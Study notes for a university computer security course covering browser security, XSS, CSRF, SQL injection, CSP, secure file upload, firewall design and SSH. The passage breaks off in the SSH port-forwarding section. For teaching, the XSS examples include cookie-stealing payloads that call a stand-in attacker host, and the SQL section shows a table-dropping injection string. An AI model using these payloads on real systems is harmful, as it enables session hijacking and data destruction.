# Topic 05 — Web and Network Defense

**Primary source coverage:** Lectures 06–08; Tutorials L6–L8; Lab 4; Sample Paper web/network/IDS/WLAN questions.

This chapter covers browser security, web application attacks, network perimeter controls, intrusion detection, wireless risks, and common denial-of-service patterns. The exam emphasis is on attack mechanism first, then targeted mitigation and trade-off.

> [!important] How to study this chapter
> Read the chapter once for the map, then drill the definitions, contrasts, and worked examples. Most exam answers should follow: define the concept, state the mechanism, name the relevant attack or failure mode, and give the defense or trade-off.

## What the Exam Asks

- Browser/web model: URL, HTTP, cookies, DOM, Same-Origin Policy.
- XSS, CSRF, SQL injection, CSP, secure file upload.
- Firewalls, DMZ, proxies, SSH tunnels, VPNs, bastion hosts.
- IDS/IPS/HIDS/NIDS, confusion matrix, base-rate problem, DDoS, ARP/DNS poisoning, WLAN/MITM.

---

## Web Architecture, HTTP, Cookies, and the Browser Security Model

> [!abstract] Why this note matters
> - Lecture 06, Tutorial L6, and Lab 4 all depend on basic browser and web architecture knowledge.
> - Many web vulnerabilities in the course only make sense if you understand what the browser is doing.

### Overview

Web security starts with understanding what a browser actually receives and executes. The server sends HTML, scripts, cookies, and other resources. The browser parses them, builds the DOM, runs scripts, and automatically attaches certain state like cookies to later requests.

Lecture 06 frames this clearly: the browser is not just displaying content. It is an execution environment. That is why the DOM, script loading order, cookie scope, and origin rules are all security-relevant.

### Exam Focus

- Tier 1 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **origin**: The triple of scheme, host, and port used by the browser security model.
- **DOM**: The Document Object Model; the browser's object representation of the page and its structure.
- **cookie**: A value stored by the browser and sent with requests under defined scope rules.
- **Same-Origin Policy**: A browser rule that restricts how scripts from one origin interact with data from another origin.

### Detailed Explanation

A URL identifies location and can include scheme, host, port, path, and query. That matters because the Same-Origin Policy compares scheme, host, and port. Two pages that share a top-level domain but differ in host or port are not automatically same-origin.

Cookies are central because HTTP is stateless, yet authenticated sessions need continuity. The browser therefore stores and reattaches cookies under specific rules. This convenience is what enables session management and also what makes CSRF possible.

The DOM matters because scripts can inspect or modify the current page dynamically. Lab 4 leans on this: if the content is in the client-side page structure, DevTools can often reveal or manipulate it because the browser already has it.

The lecture's script-loading discussion is security-relevant too. Inline scripts, external scripts, event handlers, and `javascript:` URLs are all execution paths. Any place untrusted data reaches these execution contexts can become an attack surface.

The deeper lesson is that browser security is a boundary system. Origin, cookies, transport, and document execution each draw part of the boundary. Later web attacks work by exploiting a mismatch between where developers think the boundary is and where the browser actually enforces it.

### How It Works

Browser loads document -> parses HTML -> builds DOM -> executes scripts as encountered or when events fire.

Cookies are attached automatically to matching requests according to domain/path/scheme rules.

SOP checks scheme + host + port, not merely top-level domain similarity.

### What You Must Know

- Basic URL structure and browser-loading model.
- What the DOM is and why DevTools can inspect it.
- How cookies relate to sessions and later attacks such as CSRF or cookie theft.
- How SOP defines origin.

### 30-Second Oral Answer

- Web security starts with understanding that the browser receives the page, builds the DOM, runs scripts, and automatically manages cookies.
- SOP compares scheme, host, and port, and cookies create state on top of stateless HTTP.

### Typical Exam Questions

- What is the Same-Origin Policy?
- Why are cookies critical to web authentication?
- Why can DevTools reveal hidden or client-side paywalled content?

### Common Pitfalls

- Thinking sharing `.com` makes two pages same-origin.
- Forgetting that if the browser can render it, the client already received it.

### Concrete Examples and Commands

#### URL structure reminder

```text
scheme://host[:port]/path?query
https://bank.example.com:8443/account?view=summary
```

#### Cookie flags in HTTP

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
```

These flags influence theft risk, transport requirements, and some cross-site request behavior.

### Related Concepts

- [[XSS, CSRF, SQL Injection, and Session Defenses|XSS, CSRF, SQL Injection, and Session Defenses]]
- [[Lab 3 and Lab 4 Rootkit Recon, Browser Tools, and Web Exploitation|Lab 3 and Lab 4: Rootkit Recon, Browser Tools, and Web Exploitation]]

## Mixed Content, document.domain, and Cookie Scope Across Subdomains

> [!abstract] Why this note matters
> - Tutorial L6 and its solution material include mixed content, SOP relaxation via `document.domain`, and cookie subdomain scoping.
> - These browser-scope details were present in the source archive but missing as first-class notes.

### Overview

Some web failures happen because a site weakens its own browser-side trust boundaries. Mixed content, broad cookie scoping, and SOP relaxation are all examples where a secure-looking page can become less secure because a lower-level rule is widened.

The exam relevance is that these are precise browser-behavior questions. They reward exact reasoning about what the browser considers same-origin, what HTTPS really protects, and which hosts get access to the same session state.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **mixed content**: An HTTPS page that loads some dependent resource over insecure HTTP.
- **document.domain**: A browser mechanism that can relax SOP between related subdomains by aligning them to a shared parent domain.
- **cookie domain scope**: The set of hosts or subdomains to which a cookie is sent or exposed based on its `Domain` attribute.
- **subdomain trust boundary**: The security boundary created by deciding whether multiple subdomains should share browser trust or cookie scope.

### Detailed Explanation

Mixed content is dangerous because HTTPS only protects the page as long as its dependent resources are also protected. If a script or other active resource loads over HTTP, an attacker who can tamper with that insecure path can undermine the secure page's integrity.

The `document.domain` property exists to let related subdomains opt into a shared parent-domain view. That can solve some legacy coordination problems, but it widens the trust boundary. If one participating subdomain is weaker, the relaxation can create a security path between pages that would otherwise remain isolated by SOP.

Cookie domain scope creates a similar tradeoff. A cookie scoped to `.example.com` can reach multiple subdomains. That may be convenient operationally, but it also means a weak or compromised subdomain can become a stepping stone into the same session space.

### How It Works

HTTPS page + HTTP subresource -> attacker can tamper with the insecure dependency and undermine the secure page.

SOP normally checks scheme, host, and port; `document.domain` can intentionally relax the host part between related subdomains.

A broad cookie domain expands the set of hosts that receive or can potentially misuse the cookie.

### What You Must Know

- Why mixed content is dangerous.
- What `document.domain` does at a high level.
- Why broad cookie scope across subdomains can be risky.

### 30-Second Oral Answer

- A page is only as trustworthy as the weakest resource it loads, so mixed content can break HTTPS integrity.
- Relaxing origin or cookie scope broadens the trust boundary and increases the impact of one weak subdomain.

### Typical Exam Questions

- Why is mixed content dangerous on an HTTPS page?
- What does `document.domain` do?
- What are the risks of setting a cookie for `.example.com`?

### Common Pitfalls

- Assuming the main page being HTTPS protects insecure subresources automatically.
- Assuming all subdomains are equally trustworthy just because they share a parent domain.

### Concrete Examples and Commands

#### Cookie scoping example

```http
Set-Cookie: sid=abc123; Domain=.example.com; Path=/; Secure; HttpOnly
```

This makes the cookie available more broadly than an exact-host cookie. That may be intentional, but it also widens the consequences of one weak subdomain.

### Related Concepts

- [[Web Architecture, HTTP, Cookies, and the Browser Security Model|Web Architecture, HTTP, Cookies, and the Browser Security Model]]
- [[XSS, CSRF, SQL Injection, and Session Defenses|XSS, CSRF, SQL Injection, and Session Defenses]]

## XSS, CSRF, SQL Injection, and Session Defenses

> [!abstract] Why this note matters
> - Tutorial L6 and Lab 4 directly cover these web vulnerabilities and browser-mediated defenses.
> - These are classic exam topics because each attack has a different mechanism and defense pattern.

### Overview

Web application attacks work because browsers, servers, cookies, and input handling interact in predictable ways. The course expects you to distinguish those mechanisms rather than treating all web bugs as one category.

XSS abuses how untrusted data reaches executable browser contexts. CSRF abuses how browsers automatically attach authentication state. SQL injection abuses how applications merge untrusted input into server-side queries.

### Exam Focus

- Tier 1 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **stored XSS**: A script injection that is saved by the application and later served to other users.
- **reflected XSS**: A script injection immediately reflected in a response to the victim's request.
- **DOM-based XSS**: A script injection caused entirely by client-side JavaScript and DOM manipulation.
- **CSRF**: Cross-Site Request Forgery; causing a user's browser to send authenticated requests they did not intend.
- **prepared statement**: A query mechanism that separates SQL structure from user data.

### Detailed Explanation

Stored XSS persists in the application's data and affects later visitors. Reflected XSS sends the malicious payload back immediately in the current response, often through error messages or search pages. DOM-based XSS happens entirely in the browser when unsafe client-side code inserts untrusted data into the DOM.

CSRF is different. The attacker does not need to read the victim's page. They only need the victim's browser to send a request to a site where the victim is already authenticated. Because the browser attaches cookies automatically, the server may treat the request as legitimate unless anti-CSRF defenses are present.

HttpOnly cookies help against some XSS-based cookie theft because scripts cannot read them directly. Secure cookies require HTTPS transport. SameSite can reduce some cross-site request abuse. But none of these solve every session problem, especially if the site has broader logic flaws.

SQL injection is best prevented by parameterized queries, not by ad hoc escaping rituals. Tutorial L6 explicitly emphasizes prepared statements because they keep code and data structurally separate.

### How It Works

XSS defense -> sanitize or encode untrusted output and constrain script execution.

CSRF defense -> use anti-CSRF tokens, SameSite policies, and re-authentication for sensitive actions.

SQL injection defense -> use prepared statements and safe server-side handling of untrusted input.

### What You Must Know

- Differences between stored, reflected, and DOM-based XSS.
- Why CSRF works and why CSRF tokens help.
- Why prepared statements are the preferred SQL injection defense.
- What HttpOnly and Secure cookie attributes do.

### 30-Second Oral Answer

- XSS is code injection into browser execution contexts; CSRF is browser-forced authenticated action; SQL injection is server-side query manipulation.
- Each class has a different defense pattern, so the attack mechanism must be named precisely.

### Typical Exam Questions

- What is the difference between reflected and stored XSS?
- Why do HttpOnly cookies help against some XSS attacks?
- How does CSRF work?
- Why are prepared statements better than manual string concatenation?

### Common Pitfalls

- Calling CSRF a script-injection attack.
- Treating HTTPS as a complete defense against CSRF or XSS.
- Assuming client-side validation prevents SQL injection.

### Concrete Examples and Commands

#### Stored vs Reflected XSS — Comparison

| Aspect | Stored XSS | Reflected XSS |
|--------|------------|---------------|
| Where the payload lives | Saved in the application's database (or other persistent store) | Embedded in a single request URL or form parameter |
| When it executes | Every time a victim views the affected page | When the victim clicks/submits the crafted request |
| Who the victim is | Any user who visits the page later | Only the user who is tricked into making that specific request |
| Delivery vector | The attacker just posts the payload once (e.g., into a comment) | Phishing link, malicious form, or other social-engineering bait |
| Example payload context | A blog comment field saved to DB | A search query reflected back in an error page |

**Stored XSS payload example (e.g., posted as a forum comment).**

```html
<!-- attacker submits as the comment body -->
<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>

<!-- the application saves it to the DB and renders it for every visitor: -->
<div class="comment">
  <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
</div>
```

**Reflected XSS payload example (in a crafted URL).**

```text
https://victim.example/search?q=<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>

The server includes ?q=... in the response page without encoding:

<p>You searched for: <script>fetch('https://attacker.example/steal?c='+document.cookie)</script></p>

The victim clicks the link in a phishing email; the script runs once in their browser.
```

The defining contrast: stored XSS is fire-and-forget for the attacker and persists across visitors; reflected XSS needs each victim to be lured into a specific request.

#### SQL Injection — Prepared Statements vs Escaping

**Vulnerable (string concatenation).**

```text
SQL = "SELECT * FROM users WHERE name = '" + input + "'"

input: '; DROP TABLE users; --

resulting SQL: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

**Prepared statement (parameterised query, bound input).**

```text
## Python / DB-API style
cursor.execute(
  "SELECT * FROM users WHERE name = ?",
  (input,)
)

## Java / JDBC style
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM users WHERE name = ?"
);
ps.setString(1, input);
ResultSet rs = ps.executeQuery();
```

The placeholder `?` (or `:name` / `$1` depending on the driver) marks where data goes. The database driver sends the SQL structure and the parameter values **separately** — the input is never interpreted as SQL syntax, so injection is structurally impossible.

**Why manual escaping is fragile.** Escaping tries to quote dangerous characters so they cannot break out of a string literal. The problem is encoding ambiguity:

- Multi-byte character sets (e.g., GBK, BIG5) can produce sequences where a leading byte combines with a following backslash to form a single character — the escape character is consumed and the closing quote becomes unmatched. Historic MySQL/PHP injection bugs exploited exactly this.
- Different databases interpret quoting and escaping differently (single quotes, double quotes, backticks, `\` vs doubled-quote escaping).
- Numeric and identifier contexts often have no string quoting at all, so an "escape every quote" routine misses them entirely.

Prepared statements sidestep all of this by keeping SQL syntax and data values on separate channels at the driver level. The exam-grade rule: **separate code from data — never trust escaping alone.**

### Related Concepts

- [[Web Architecture, HTTP, Cookies, and the Browser Security Model|Web Architecture, HTTP, Cookies, and the Browser Security Model]]
- [[Lab 1 and Lab 2 Cryptography, Authentication, and Web Weaknesses|Lab 1 and Lab 2: Cryptography, Authentication, and Web Weaknesses]]
- [[Lab 3 and Lab 4 Rootkit Recon, Browser Tools, and Web Exploitation|Lab 3 and Lab 4: Rootkit Recon, Browser Tools, and Web Exploitation]]

## Content Security Policy, Secure File Upload, and Advanced Web Defenses

> [!abstract] Why this note matters
> - Tutorial L6 Part B Q7 asks about CSP directives and how they mitigate XSS.
> - Tutorial L6 Part B Q10 asks for a secure file-upload checklist — three or more distinct measures.
> - These are short-answer questions that require precise, enumerable answers.

### Overview

CSP and file-upload security are server-side controls that complement the client-side browser security model. CSP restricts which resources a page may load and execute, dramatically reducing the attack surface for XSS. Secure file upload design prevents attackers from using upload functionality as a code execution vector.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **Content Security Policy (CSP)**: An HTTP response header that instructs the browser to restrict which sources of scripts, styles, images, and other content are considered trusted for that page.
- **default-src**: A CSP directive that serves as a fallback for all content types not explicitly specified.
- **script-src**: A CSP directive that specifies trusted sources of JavaScript.
- **nonce**: A random per-request value included in a CSP header and in inline `<script>` tags; the browser only executes scripts whose nonce matches.
- **MIME type**: A label (e.g., `image/jpeg`, `text/html`) that describes a file's content type, used by browsers to decide how to render it.
- **webroot**: The directory on the server from which files are directly served by the web server; files stored here are accessible via HTTP URLs.

### Detailed Explanation

#### Content Security Policy (CSP)

CSP is delivered as an HTTP header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

The browser reads this and enforces the rules on the page. Any resource or script that violates the policy is blocked.

**Key directives:**

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all content types not listed separately |
| `script-src` | JavaScript sources; can require `'self'`, specific URLs, or nonces |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | AJAX/fetch/WebSocket targets |
| `frame-src` | Allowed iframe sources |
| `report-uri` | URL to send CSP violation reports to |

**How CSP mitigates XSS:**

- `script-src 'self'` blocks inline scripts and external scripts from unauthorized origins. Even if an attacker injects `<script>alert(1)</script>`, the browser refuses to run it.
- `script-src 'nonce-xyz'` means only `<script nonce="xyz">` tags execute. Since the attacker cannot know the nonce (it changes per request), their injected scripts are blocked even if the HTML is injected.
- `default-src 'none'` followed by explicit allowlists creates a tight, minimal attack surface.

**Limitations:**
- CSP does not prevent XSS injection into the HTML — it prevents execution of the injected script.
- Overly permissive policies (e.g., `unsafe-inline`, wildcards) negate the benefits.
- CSP errors can break legitimate functionality if not tested carefully.

#### Secure File Upload Design

File upload functionality is a common attack vector. Attackers may upload PHP, HTML, or other executable files and then trigger their execution via a URL.

**Minimum checklist of defenses (the exam expects at least three):**

1. **Validate file type using MIME type and extension**: Accept only known-safe types (e.g., `image/jpeg`, `image/png`). Do not trust the Content-Type the browser sends — verify server-side using file-type detection libraries.

2. **Rename the uploaded file on the server**: Replace the user-supplied filename with a randomly generated server-side name. This prevents attackers from predicting the URL of their uploaded file and prevents path traversal via specially crafted names (`../../etc/passwd`).

3. **Store files outside the webroot**: Files stored in a directory not directly served by the web server cannot be executed via HTTP URL. Serve files through a controlled download handler that reads from the private storage location.

4. **Serve files with correct Content-Type headers**: When serving files, set `Content-Type: image/jpeg` explicitly rather than letting the browser sniff the type. This prevents the browser from treating an HTML file disguised as a JPEG as executable HTML.

5. **Scan for malicious content**: Run uploaded files through antivirus or image-sanitization libraries. For images, strip EXIF metadata and re-encode the image to remove embedded payloads.

6. **Enforce size limits**: Large uploads can cause DoS. Set maximum file size constraints.

### How It Works

CSP → HTTP header → browser enforces resource restrictions → blocked scripts do not execute even if injected.

Secure upload → validate type → rename → store outside webroot → serve through handler → correct headers → scan.

### What You Must Know

- What `default-src`, `script-src`, and nonces do in CSP.
- How CSP reduces XSS attack surface (blocks execution, not just injection).
- At least three distinct secure file-upload measures and why each matters.
- Why storing files in the webroot is dangerous.

### 30-Second Oral Answer

- CSP tells the browser which script sources are trusted; `script-src 'self'` blocks third-party scripts; nonces block inline injections even when HTML is compromised.
- Secure file upload requires validating MIME type, renaming the file server-side, storing outside the webroot, and controlling Content-Type on download.
- CSP mitigates but does not eliminate XSS — it prevents the injected script from executing, not the injection itself.

### Typical Exam Questions

- Outline how a CSP can mitigate XSS attacks. Name two specific directives and explain their effect.
- What steps should a server take to ensure uploaded files cannot be executed as scripts?
- How does a CSP nonce work and why is it effective against inline script injection?

### Common Pitfalls

- **CSP does not prevent injection.** It prevents the browser from EXECUTING injected scripts. Injection itself is still possible — an attacker can still insert `<script>...</script>` into the HTML. CSP just makes the injected script harmless if it violates the policy (no matching nonce, disallowed origin, etc.). The HTML may still contain attacker-controlled content; what changes is that the browser refuses to run it.
- Forgetting that trusting the browser-supplied MIME type is insecure — always validate server-side.
- Saying "only allow images" without specifying how that validation is performed (extension is not enough; MIME sniffing and content inspection are needed).

### Concrete Examples and Commands

#### CSP header examples

```http
## Allow scripts only from same origin
Content-Security-Policy: script-src 'self'

## Allow scripts with a specific nonce only
Content-Security-Policy: script-src 'nonce-rAnd0mV4lu3'

## Maximum restriction starting point
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'
```

#### Script blocked by CSP nonce

```html
<!-- Legitimate script (nonce matches) -->
<script nonce="rAnd0mV4lu3">doLegitimateWork();</script>

<!-- Attacker-injected script (no nonce) — browser blocks it -->
<script>stealCookies();</script>
```

#### Secure file upload flow

```text
1. User uploads "profile.php" pretending to be an image.
2. Server validates: Content-Type = image/jpeg? → read file magic bytes → not a JPEG → reject.
3. If valid image: rename to "a3f8c2b1.jpg", store at /var/app/uploads/ (outside webroot).
4. When user requests the file: handler reads /var/app/uploads/a3f8c2b1.jpg,
   sends response with Content-Type: image/jpeg header.
5. Browser treats file as image, not HTML. Embedded PHP is never executed.
```

### Related Concepts

- [[XSS, CSRF, SQL Injection, and Session Defenses|XSS, CSRF, SQL Injection, and Session Defenses]]
- [[Web Architecture, HTTP, Cookies, and the Browser Security Model|Web Architecture, HTTP, Cookies, and the Browser Security Model]]
- [[University/BCS2420 Computer Security Knowledge Base/05 Web and Network Defense/Mixed Content, document.domain, and Cookie Scope Across Subdomains|Mixed Content, document.domain, and Cookie Scope Across Subdomains]]

## Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs

> [!abstract] Why this note matters
> - Lecture 7 and Tutorial L7 focus on network defense through gateways and tunnels.
> - This is a clean compare/contrast topic with recurring design principles like safe defaults and statefulness.

### Overview

Lecture 7 presents firewalls as perimeter controls that isolate damage and control traffic between trusted and untrusted zones. That is a strategic security function, not only a packet-filtering trick.

The course also treats tunnels as ways to protect or expose protocols differently, especially when insecure application traffic is wrapped inside an encrypted channel like SSH or a VPN.

### Exam Focus

- Tier 1 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **packet-filter firewall**: A firewall that allows or denies packets based on header fields and policy rules.
- **stateful firewall**: A firewall that tracks connection state and uses it in filtering decisions.
- **DMZ**: A network segment for public-facing services isolated from the internal network.
- **proxy firewall**: A gateway that relays traffic at the application or circuit level and can inspect higher-level content.
- **tunnel**: An encapsulated communication path that carries one protocol inside another, often with encryption.

### Detailed Explanation

Packet-filter firewalls apply rules based on header fields such as source address, destination address, ports, and flags. Stateless firewalls evaluate each packet independently. Stateful firewalls use memory of earlier traffic, which lets them allow return traffic only when it matches an established outbound flow.

Default-deny rulesets are a direct application of safe defaults. Instead of allowing everything except explicit bans, the firewall blocks everything unless an accept rule permits it. That reduces attack surface and surprises.

DMZs support isolated compartments by placing public services in a constrained segment rather than directly on the trusted internal network. Proxy firewalls go further by relaying traffic and potentially inspecting application-layer content or enforcing protocol constraints.

SSH port forwarding and VPN tunnel mode protect otherwise exposed or plaintext traffic by encapsulating it inside an encrypted channel. Tutorial L7 highlights how local forwarding can make an insecure application protocol safer by protecting it in transit.

The source material also implies that firewalling is part of a broader perimeter architecture. A ruleset is one layer, but screened subnets, bastion hosts, and careful default policy choices determine how much one ruleset mistake can expose.

### How It Works

Stateless rule: match headers only.

Stateful rule: match headers plus known connection context.

DMZ: public service zone with restricted connectivity to internal networks.

Tunnel mode VPN: encapsulate the full IP packet inside a new outer packet for protected transit.

### What You Must Know

- Differences between stateless and stateful firewalls.
- What a default-deny policy means.
- Purpose of a DMZ.
- What proxy firewalls, SSH port forwarding, and tunnel-mode VPNs do at a high level.

### 30-Second Oral Answer

- Firewalls are policy-enforcement gateways; stateful firewalls understand connection context while stateless ones do not.
- DMZs isolate public services, proxy firewalls relay and inspect, and tunnels encapsulate traffic to protect it.

### Typical Exam Questions

- Why are stateful firewalls often better than stateless ones for return traffic?
- What is a DMZ for?
- How does SSH local port forwarding improve confidentiality for an insecure protocol?
- What does tunnel mode VPN protect?

### Common Pitfalls

- Saying a firewall blocks malicious content completely just because a port is restricted.
- Confusing default-allow with default-deny.

### Concrete Examples and Commands

#### Stateful filtering intuition

```text
Outbound HTTP request from internal host -> allow
Inbound response packet with matching session state -> allow
Unsolicited inbound packet to same port without matching state -> drop
```

#### SSH local forwarding pattern

```bash
ssh -L 8080:internal.example:80 user@gateway.example
```

Traffic sent to local port 8080 is forwarded through the encrypted SSH session to the remote internal service.

### Related Concepts

- [[Defense in Depth, Security Strategy, and Security Posture|Defense in Depth, Security Strategy, and Security Posture]]
- [[Firewall Policy Design, Bastion Hosts, and Port Knocking|Firewall Policy Design, Bastion Hosts, and Port Knocking]]
- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]

## Firewall Policy Design, Bastion Hosts, and Port Knocking

> [!abstract] Why this note matters
> - Tutorial L7 and the retained corpus explicitly include default-allow vs default-deny, bastion hosts, and port knocking.
> - These architectural details were part of the source scope but not yet promoted into the concept layer.

### Overview

Firewall security is not only about matching packets against rules. It also depends on how the policy is framed and what architecture exists around the firewall.

Default-deny, bastion hosts, and port knocking are all examples of shaping exposure rather than only reacting to bad packets after exposure already exists.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **default-deny**: A policy where traffic is blocked unless a rule explicitly allows it.
- **default-allow**: A policy where traffic is allowed unless a rule explicitly blocks it.
- **bastion host**: A hardened, deliberately exposed system placed at a network boundary for controlled access.
- **port knocking**: A stealth-oriented technique where a port opens only after a secret sequence of connection attempts is observed.

### Detailed Explanation

#### Default-Deny vs Default-Allow — the Failure-Mode Argument

Default-deny is safer because it forces administrators to enumerate what truly needs to be reachable. Unknown services and forgotten exposures are therefore less likely to remain accessible accidentally. Default-allow is easier operationally at first, but it is riskier because unlisted traffic remains open by default.

The exam-grade framing is in terms of **failure modes**:

- **Default-deny's failure mode is service breakage.** If a rule is missing, a legitimate service stops working. The failure is loud, visible, and recoverable — someone files a ticket, the admin adds the rule.
- **Default-allow's failure mode is silent unauthorised access.** If a denial rule is missing, the unwanted service stays exposed. The failure is invisible, undetected, and unrecoverable once exploited.

Default-deny is the safer policy because the failure mode is service breakage (visible, recoverable), whereas default-allow's failure mode is silent unauthorised access (invisible, unrecoverable). Lecture 7 calls this the principle of **SAFE-DEFAULTS**.

#### Worked Two-Rule Comparison

Consider a simple policy with two rules and a default action. The intent: allow inbound HTTP traffic to the web server only.

**Default-deny ruleset.**

```text
Rule 1:  ALLOW  dst-port 80  dst-ip 10.0.0.5     # web server
Rule 2:  (no other rules)
Default: DENY everything else

Effect: SSH (port 22), database (port 5432), and everything else are
        blocked unless explicitly added later.
A forgotten admin port stays closed; if a service needs it, it breaks
visibly and the admin must add a rule.
```

**Default-allow ruleset.**

```text
Rule 1:  DENY   dst-port 22                       # block SSH
Rule 2:  DENY   dst-port 5432                     # block database
Default: ALLOW everything else

Effect: Only the explicitly denied ports are closed. If a new service
        appears on port 9000 with a vulnerability, it is open by default.
The admin must remember every dangerous port and add a deny rule for it.
A forgotten port stays open silently.
```

The two rulesets implement opposite philosophies. The first one fails closed; the second one fails open.

#### Enterprise Firewall Architectures — From Lecture 7

The lecture walks through a progression of architectures, each one tightening the perimeter relative to the previous.

**1. Single screening router.** A single packet-filtering router between the Internet and the internal network. Basic protection, limited configurability, single point of failure. Suitable only for small or low-risk deployments.

**2. Screening router + bastion host.** A screening router in front, plus a hardened bastion host behind it. The bastion accepts external interaction in a controlled way; the router filters traffic to and from the bastion. More configurable, more defensible, but still effectively one perimeter.

**3. DMZ with two screening routers (or a dual-homed host).** A demilitarised zone — a subnetwork between the Internet and the internal network — sits between two screening routers (or behind a dual-homed host with two network interfaces). Public-facing services (web server, DNS server) live in the DMZ; internal hosts live behind a second router. A compromise in the DMZ does not automatically reach the internal network because a second filter sits in the way. This is the standard enterprise pattern.

The DMZ design is the practical application of the **isolated-compartments** principle: don't let a single perimeter breach reach the crown jewels.

#### Bastion Host

A bastion host is a specially hardened system that accepts external interaction in a controlled way. Instead of letting the outside world talk broadly to internal systems, the architecture narrows exposure to one carefully defended boundary component. Non-essential services are disabled to minimise attack surface.

#### Port Knocking

Port knocking is an exposure-management tactic. It hides a service until a client presents the correct secret sequence of connection attempts. This can reduce scanning visibility and opportunistic probing, but it should be understood as a stealth aid rather than a substitute for real authentication and encryption.

### How It Works

Default-deny -> allowlist mindset.

Default-allow -> denylist mindset.

Bastion host -> hardened exposed boundary point.

Port knocking -> open port only after the right knock sequence is observed.

### What You Must Know

- Difference between default-allow and default-deny.
- What a bastion host is for.
- Why port knocking may be used and what it does not replace.

### 30-Second Oral Answer

- Default-deny is safer because unknown traffic is blocked unless explicitly permitted.
- A bastion host narrows and hardens perimeter exposure, while port knocking reduces visible exposed services.

### Typical Exam Questions

- Compare default-allow and default-deny policies.
- What is a bastion host?
- Why might port knocking be used with a firewall?

### Common Pitfalls

- Treating port knocking as complete authentication.
- Assuming default-allow can be made equally safe just by adding a few deny rules.
### Related Concepts

- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]
- [[Defense in Depth, Security Strategy, and Security Posture|Defense in Depth, Security Strategy, and Security Posture]]
- [[SSH Protocol, Authentication, and Tunneling|SSH Protocol, Authentication, and Tunneling]]

## SSH Protocol, Authentication, and Tunneling

> [!abstract] Why this note matters
> - Lecture 7 dedicates an entire section to SSH as the canonical replacement for insecure legacy protocols.
> - SSH is one of three protocols (along with TLS and IPsec) that the lecture maps to specific layers of the network stack — a frequent multiple-choice topic.
> - Port forwarding via SSH is the concrete tunneling example exam questions can build on.

### Overview

SSH (Secure Shell) is the encrypted replacement for a generation of insecure protocols (rsh, rlogin, telnet, ftp, rcp). The course frames SSH in three ways: as a layered protocol with transport, authentication, and connection sub-protocols; as a host-authenticated, client-authenticated channel; and as a tunneling tool that can carry traffic for other applications.

SSH also sits at the application layer of the stack, which matters because TLS, IPsec, and SSH each protect at different layers — and a common exam question asks where each lives.

### Exam Focus

- Tier 2 priority. SSH is well defined in Lecture 7 and asked in Tutorial L7.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **SSH (Secure Shell)**: A protocol that provides authenticated, encrypted communication over an untrusted network.
- **Transport Layer (SSH)**: The SSH sub-protocol that provides encryption and integrity.
- **Authentication (SSH)**: The SSH sub-protocol that manages client-server authentication.
- **Connection (SSH)**: The SSH sub-protocol that allows multiple multiplexed sessions over one connection.
- **SCP (Secure Copy)**: A file-transfer command that uses SSH as its transport, replacing rcp.
- **SSH host key**: The server's public key, verified by the client to authenticate the server.
- **port forwarding**: Redirecting traffic for one application through an SSH tunnel for encryption or to traverse a firewall.

### Detailed Explanation

#### Three-Layer Architecture

SSH is built from three stacked sub-protocols:

| Sub-protocol | Responsibility |
|--------------|----------------|
| **Transport Layer** | Encrypts and integrity-protects the channel between client and server. |
| **Authentication** | Handles how the client proves identity to the server. |
| **Connection** | Multiplexes multiple logical sessions (interactive shell, port forwards, file transfers) over the single encrypted channel. |

The connection sub-protocol is what enables one SSH session to host an interactive shell and several port forwards at the same time.

#### What SSH Replaces

Insecure legacy protocols sent passwords and data in cleartext. SSH replaces them one for one:

| Legacy (insecure) | SSH replacement | Functionality |
|-------------------|-----------------|---------------|
| `rsh` (remote shell) | `ssh` | Run shell commands on a remote host. |
| `rlogin` (remote login) | `ssh` | Log in to a remote host as if local. |
| `telnet` (teletype network) | `ssh` | Acquire an interactive terminal over TCP. |
| `ftp` (file transfer) | `sftp` / `ftps` (FTP over TLS) | Transfer files. |
| `rcp` (remote copy) | `scp` (secure copy) | Copy files between local and remote. |

#### Three Client Authentication Methods

SSH supports three ways for the client to prove identity to the server:

1. **Client password**: The user supplies a password. Encrypted in transit by SSH, so safer than telnet passwords, but still vulnerable to password attacks if weak.
2. **Kerberos ticket**: The client presents a Kerberos ticket obtained from a trusted ticket-granting infrastructure.
3. **Client public key**: The client signs a challenge with its private key; the server verifies using the corresponding public key it has on file. This is the modern preferred method.

#### Server Authentication: Two Trust Models

The server proves its identity using a public key (the SSH host key) that the client verifies. There are two trust models for how the client decides whether to trust a host key:

1. **Local database of host keys**: The client stores known host keys locally (the classic `~/.ssh/known_hosts` file). First connection is trust-on-first-use; subsequent connections check the stored fingerprint.
2. **CA-certified server keys**: The client trusts a Certificate Authority's public key, and the server presents a host key signed by that CA. This scales better in enterprise environments.

#### SCP (Secure Copy)

SCP is a file-transfer tool that uses an SSH tunnel internally. From the user's view it behaves like `cp` between local and remote paths. Under the hood, the SCP client spawns an SSH connection, and a peer SCP process is started by `sshd` on the remote side. SCP replaces the insecure `rcp`.

#### Port Forwarding

SSH can redirect arbitrary application traffic through its encrypted tunnel. Three flavours exist:

